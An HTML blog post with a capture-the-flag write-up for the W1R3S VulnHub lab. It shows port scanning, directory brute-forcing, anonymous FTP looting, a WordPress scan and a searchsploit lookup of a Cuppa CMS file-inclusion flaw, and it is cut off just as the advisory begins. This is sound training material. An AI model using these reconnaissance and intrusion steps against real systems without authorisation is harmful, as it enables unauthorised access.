@@ -1,0 +1,1206 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Getting in the W1R3S - Core dump overflow</title>
+  <meta name="author" content="chousensha">
+
+  
+  
+  <meta name="description" content="W1r3S writeup">
+  <meta name="keywords" content="w1r3s, pentest lab, vulnhub, ctf, boot2root, wpseku, cuppa cms">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://chousensha.github.io/blog/2018/11/30/getting-in-the-w1r3s">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-51216602-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Core dump overflow</a></h1>
+  
+    <h2>Core dump in progress...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:chousensha.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/where-to-start">Where to start</a></li>
+  <li><a href="/book-corner">Book corner</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Getting in the W1R3S</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2018-11-30T16:18:45+02:00" pubdate data-updated="true">Nov 30<span>th</span>, 2018</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://chousensha.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>With today&rsquo;s post I am experimenting with a new way of writing my hacking blog posts based on the <a href="https://redteams.net/redteaming/2017/phases-of-a-red-team-assessment-revisited">5 phases of red teams assessments</a>.</p>
+
+<!-- more -->
+
+
+<h2>Phase 1: OPORD</h2>
+
+<p>The machine description is the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>You have been hired to do a penetration test on the W1R3S.inc individual server and report all findings. They have asked you to gain root access and find the flag (located in /root directory).
+</span><span class='line'>
+</span><span class='line'>Difficulty to get a low privileged shell: Beginner/Intermediate
+</span><span class='line'>
+</span><span class='line'>Difficulty to get privilege escalation: Beginner/Intermediate
+</span><span class='line'>
+</span><span class='line'>About: This is a vulnerable Ubuntu box giving you somewhat of a real world scenario and reminds me of the OSCP labs.</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Phase 2: RECON</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE VERSION
+</span><span class='line'>21/tcp   open  ftp     vsftpd 2.0.8 or later
+</span><span class='line'>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span><span class='line'>| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
+</span><span class='line'>| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
+</span><span class='line'>|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
+</span><span class='line'>| ftp-syst:
+</span><span class='line'>|   STAT:
+</span><span class='line'>| FTP server status:
+</span><span class='line'>|      Connected to ::ffff:192.168.145.130
+</span><span class='line'>|      Logged in as ftp
+</span><span class='line'>|      TYPE: ASCII
+</span><span class='line'>|      No session bandwidth limit
+</span><span class='line'>|      Session timeout in seconds is 300
+</span><span class='line'>|      Control connection is plain text
+</span><span class='line'>|      Data connections will be plain text
+</span><span class='line'>|      At session startup, client count was 1
+</span><span class='line'>|      vsFTPd 3.0.3 - secure, fast, stable
+</span><span class='line'>|_End of status
+</span><span class='line'>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>| ssh-hostkey:
+</span><span class='line'>|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
+</span><span class='line'>|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
+</span><span class='line'>|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
+</span><span class='line'>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
+</span><span class='line'>|_http-title: Apache2 Ubuntu Default Page: It works
+</span><span class='line'>3306/tcp open  mysql   MySQL (unauthorized)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The immediate points of interest are the FTP server, and the web server. Since Nmap only found the Apache default page, I started some background enumeration with Gobuster:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gobuster -u http://192.168.145.134 -w /usr/share/wordlists/dirb/common.txt
+</span><span class='line'>
+</span><span class='line'>=====================================================
+</span><span class='line'>Gobuster v2.0.0              OJ Reeves (@TheColonial)
+</span><span class='line'>=====================================================
+</span><span class='line'>[+] Mode         : dir
+</span><span class='line'>[+] Url/Domain   : http://192.168.145.134/
+</span><span class='line'>[+] Threads      : 10
+</span><span class='line'>[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+</span><span class='line'>[+] Status codes : 200,204,301,302,307,403
+</span><span class='line'>[+] Timeout      : 10s
+</span><span class='line'>=====================================================
+</span><span class='line'>2018/11/30 05:46:49 Starting gobuster
+</span><span class='line'>=====================================================
+</span><span class='line'>/.hta (Status: 403)
+</span><span class='line'>/.htaccess (Status: 403)
+</span><span class='line'>/.htpasswd (Status: 403)
+</span><span class='line'>/administrator (Status: 301)
+</span><span class='line'>/index.html (Status: 200)
+</span><span class='line'>/javascript (Status: 301)
+</span><span class='line'>/server-status (Status: 403)
+</span><span class='line'>/wordpress (Status: 301)
+</span><span class='line'>=====================================================</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok, we have some web directories to check..a possible Wordpress installation, a MySQL database and an FTP server that we can login to.</p>
+
+<h2>Phase 3: TARGET ID</h2>
+
+<p>Logging in to the FTP server, we see the following directories:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>150 Here comes the directory listing.
+</span><span class='line'>drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
+</span><span class='line'>drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
+</span><span class='line'>drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I downloaded them to my machine with <code>wget -r <a href="ftp://ftp:anonymous@192.168.145.134/">ftp://ftp:anonymous@192.168.145.134/</a></code>. Inside the <em>content</em> folder there are 3 text files, and one of them contains potentially interesting data:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@onosendai:~/target/192.168.145.134/content# ls -alh
+</span><span class='line'>total 20K
+</span><span class='line'>drwxr-xr-x 2 root root 4.0K Nov 30 06:16 .
+</span><span class='line'>drwxr-xr-x 5 root root 4.0K Nov 30 06:16 ..
+</span><span class='line'>-rw-r--r-- 1 root root   29 Jan 23  2018 01.txt
+</span><span class='line'>-rw-r--r-- 1 root root  165 Jan 23  2018 02.txt
+</span><span class='line'>-rw-r--r-- 1 root root  582 Jan 23  2018 03.txt
+</span><span class='line'>root@onosendai:~/target/192.168.145.134/content# cat 01.txt
+</span><span class='line'>New FTP Server For W1R3S.inc
+</span><span class='line'>root@onosendai:~/target/192.168.145.134/content# cat 02.txt
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>01ec2d8fc11c493b25029fb1f47f39ce
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>#
+</span><span class='line'>SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==
+</span><span class='line'>############################################
+</span><span class='line'>root@onosendai:~/target/192.168.145.134/content# cat 03.txt
+</span><span class='line'>___________.__              __      __  ______________________   _________    .__               
+</span><span class='line'>\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  
+</span><span class='line'>  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  &lt; \_____  \     |  |/    \_/ ___\
+</span><span class='line'>  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___
+</span><span class='line'>  |____|   |___|  /\___  &gt;   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  &gt;
+</span><span class='line'>                \/     \/         \/                \/       \/        \/  \/         \/     \/</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I used an online MD5 hash cracker to get the value <code>This is not a password</code>. And the base64 string gave the message that <code>It is easy, but not that easy..</code>. So there are probably red herrings, let&rsquo;s move on.</p>
+
+<p>Inside <em>docs</em> there&rsquo;s a text file with some upside down text:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@onosendai:~/target/192.168.145.134/docs# cat worktodo.txt
+</span><span class='line'>  ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡
+</span><span class='line'>
+</span><span class='line'>....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Used an <a href="http://flip-upsidedown-text.1bestlink.net/">online converter</a> to flip this and reverse it for the text:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>we have a ןot of work to do‘ stop pןaying around˙˙˙˙
+</span><span class='line'>i don't think this is the way to root!</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is also useless..The final piece gives us some names that we might be able to use later:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@onosendai:~/target/192.168.145.134/new-employees# cat employee-names.txt
+</span><span class='line'>The W1R3S.inc employee list
+</span><span class='line'>
+</span><span class='line'>Naomi.W - Manager
+</span><span class='line'>Hector.A - IT Dept
+</span><span class='line'>Joseph.G - Web Design
+</span><span class='line'>Albert.O - Web Design
+</span><span class='line'>Gina.L - Inventory
+</span><span class='line'>Rico.D - Human Resources</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is all the information we got from the FTP vector. Let&rsquo;s return to the web server now. The javascript folder was forbidden for viewing, and the wordpress folder redirected to localhost/wordpress, so I had to modify my <code>/etc/hosts</code> file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.145.134 localhost</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now I could get to the Wordpress blog, which looks to be under construction:</p>
+
+<p><img class="center" src="/images/pentest/w1r3s/wordpress.png" title="wordpress" alt="wordpress"></p>
+
+<p>I decided to go with an alternate Wordpress scanner for this one, so instead of WPScan, I went with <a href="https://github.com/m4ll0k/WPSeku">WPSeku</a></p>
+
+<blockquote><p>WPSeku &ndash; Wordpress Security Scanner</p>
+
+<p>WPSeku is a black box WordPress vulnerability scanner that can be used to scan remote WordPress installations to find security issues.</p></blockquote>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>python3 wpseku.py
+</span><span class='line'>----------------------------------------
+</span><span class='line'> _ _ _ ___ ___ ___| |_ _ _
+</span><span class='line'>| | | | . |_ -| -_| '_| | |
+</span><span class='line'>|_____|  _|___|___|_,_|___|
+</span><span class='line'>      |_|             v0.4.0
+</span><span class='line'>
+</span><span class='line'>WPSeku - Wordpress Security Scanner
+</span><span class='line'>by Momo Outaadi (m4ll0k)
+</span><span class='line'>----------------------------------------
+</span><span class='line'>
+</span><span class='line'>Usage: wpseku.py [options]
+</span><span class='line'>
+</span><span class='line'>  -u --url    Target URL (e.g: http://site.com)
+</span><span class='line'>  -b --brute  Bruteforce login via xmlrpc
+</span><span class='line'>  -U --user   Set username for bruteforce, default "admin"
+</span><span class='line'>  -s --scan   Checking wordpress plugin code
+</span><span class='line'>  -p --proxy  Use a proxy, (host:port)
+</span><span class='line'>  -c --cookie Set HTTP Cookie header value
+</span><span class='line'>  -a --agent  Set HTTP User-agent header value
+</span><span class='line'>  -r --ragent Use random User-agent header value
+</span><span class='line'>  -R --redirect   Set redirect target URL False
+</span><span class='line'>  -t --timeout    Seconds to wait before timeout connection
+</span><span class='line'>  -w --wordlist   Set wordlist, default "db/wordlist.txt"
+</span><span class='line'>  -v --verbose    Print more informations
+</span><span class='line'>  -h --help   Show this help and exit
+</span><span class='line'>
+</span><span class='line'>Example:
+</span><span class='line'>   wpseku.py --url http://site.com/
+</span><span class='line'>   wpseku.py --url http://site.com --brute --user test
+</span><span class='line'>   wpseku.py --url http://site.com/ --brute --user admin --wordlist wordlist.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ran it against the target:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>python3 wpseku.py -u http://localhost/wordpress/ -v
+</span><span class='line'>----------------------------------------
+</span><span class='line'> _ _ _ ___ ___ ___| |_ _ _
+</span><span class='line'>| | | | . |_ -| -_| '_| | |
+</span><span class='line'>|_____|  _|___|___|_,_|___|
+</span><span class='line'>      |_|             v0.4.0
+</span><span class='line'>
+</span><span class='line'>WPSeku - Wordpress Security Scanner
+</span><span class='line'>by Momo Outaadi (m4ll0k)
+</span><span class='line'>----------------------------------------
+</span><span class='line'>
+</span><span class='line'>[ + ] Target: http://localhost/wordpress/
+</span><span class='line'>[ + ] Starting: 07:52:06
+</span><span class='line'>
+</span><span class='line'>[ + ] Server: Apache/2.4.18 (Ubuntu)
+</span><span class='line'>[ i ] Checking Full Path Disclosure...
+</span><span class='line'>[ i ] Checking wp-config backup file...
+</span><span class='line'>[ + ] wp-config.php available at: http://localhost/wordpress/wp-config.php
+</span><span class='line'>[ i ] Checking common files...
+</span><span class='line'>[ + ] readme.html file was found at: http://localhost/wordpress/readme.html
+</span><span class='line'>[ i ] Checking directory listing...
+</span><span class='line'>[ + ] Dir "/wp-admin/css" listing enable at: http://localhost/wordpress/wp-admin/css/
+</span><span class='line'>[ + ] Dir "/wp-admin/images" listing enable at: http://localhost/wordpress/wp-admin/images/
+</span><span class='line'>[ + ] Dir "/wp-admin/includes" listing enable at: http://localhost/wordpress/wp-admin/includes/
+</span><span class='line'>[ + ] Dir "/wp-admin/js" listing enable at: http://localhost/wordpress/wp-admin/js/
+</span><span class='line'>[ + ] Dir "/wp-content/uploads" listing enable at: http://localhost/wordpress/wp-content/uploads/
+</span><span class='line'>[ + ] Dir "/wp-includes/" listing enable at: http://localhost/wordpress/wp-includes/
+</span><span class='line'>[ + ] Dir "/wp-includes/js" listing enable at: http://localhost/wordpress/wp-includes/js/
+</span><span class='line'>[ + ] Dir "/wp-includes/Text" listing enable at: http://localhost/wordpress/wp-includes/Text/
+</span><span class='line'>[ + ] Dir "/wp-includes/css" listing enable at: http://localhost/wordpress/wp-includes/css/
+</span><span class='line'>[ + ] Dir "/wp-includes/images" listing enable at: http://localhost/wordpress/wp-includes/images/
+</span><span class='line'>[ + ] Dir "/wp-includes/pomo" listing enable at: http://localhost/wordpress/wp-includes/pomo/
+</span><span class='line'>[ + ] Dir "/wp-includes/theme-compat" listing enable at: http://localhost/wordpress/wp-includes/theme-compat/
+</span><span class='line'>[ i ] Checking wp-loging protection...
+</span><span class='line'>[ i ] Checking robots paths...
+</span><span class='line'>[ i ] Checking WordPress version...
+</span><span class='line'>[ + ] Running WordPress version: 4.9.8
+</span><span class='line'>  |   Not found vulnerabilities
+</span><span class='line'>
+</span><span class='line'>[ i ] Passive enumeration themes...
+</span><span class='line'>[ + ] Name: twentyseventeen
+</span><span class='line'>[ i ] Checking themes changelog...
+</span><span class='line'>[ i ] Checking themes full path disclosure...
+</span><span class='line'>[ i ] Checking themes license...
+</span><span class='line'>[ i ] Checking themes readme...
+</span><span class='line'>[ i ] Checking themes directory listing...
+</span><span class='line'>[ i ] Checking theme vulnerabilities...
+</span><span class='line'>  |   Not found vulnerabilities
+</span><span class='line'>
+</span><span class='line'>[ i ] Passive enumeration plugins...
+</span><span class='line'>[ + ] Not found plugins with passive enumeration
+</span><span class='line'>[ i ] Enumerating users...
+</span><span class='line'>----------------------------
+</span><span class='line'>| ID | Username | Login    |
+</span><span class='line'>----------------------------
+</span><span class='line'>|  0 | Admin    | admin    |
+</span><span class='line'>|  1 | Admin    | None     |
+</span><span class='line'>|  2 |          | admin    |
+</span><span class='line'>|  3 |          | joseph-g |
+</span><span class='line'>----------------------------</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nothing evidently exploitable in the scan results, so I turned to the <em>/administrator</em> folder on the web server and got to the configuration screen of a Cuppa CMS:</p>
+
+<p><img class="center" src="/images/pentest/w1r3s/cuppa-cms.png" title="cuppa cms" alt="cuppa cms"></p>
+
+<p>Couldn&rsquo;t proceed with the configuration because I didn&rsquo;t have enough information:</p>
+
+<p><img class="center" src="/images/pentest/w1r3s/cuppa-admin.png" title="cuppa admin" alt="cuppa admin"></p>
+
+<p>I&rsquo;ve never heard of this CMS before, I ran a quick searchsploit and got a hit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>searchsploit cuppa cms
+</span><span class='line'>------------------------------------------------------------------------------------------------------------ ----------------------------------------
+</span><span class='line'> Exploit Title                                                                                              |  Path
+</span><span class='line'>                                                                                                            | (/usr/share/exploitdb/)
+</span><span class='line'>------------------------------------------------------------------------------------------------------------ ----------------------------------------
+</span><span class='line'>Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                             | exploits/php/webapps/25971.txt
+</span><span class='line'>------------------------------------------------------------------------------------------------------------ ----------------------------------------</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s see what this is about:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>####################################
+</span><span class='line'>
+</span><span class='line'>VULNERABILITY: PHP CODE INJECTION
+</span><span class='line'>
+</span><span class='line'>####################################
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>/alerts/alertConfigField.php (LINE: 22)
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>-----------------------------------------------------------------------------
+</span><span class='line'>
+</span><span class='line'>LINE 22:
+</span><span class='line'>
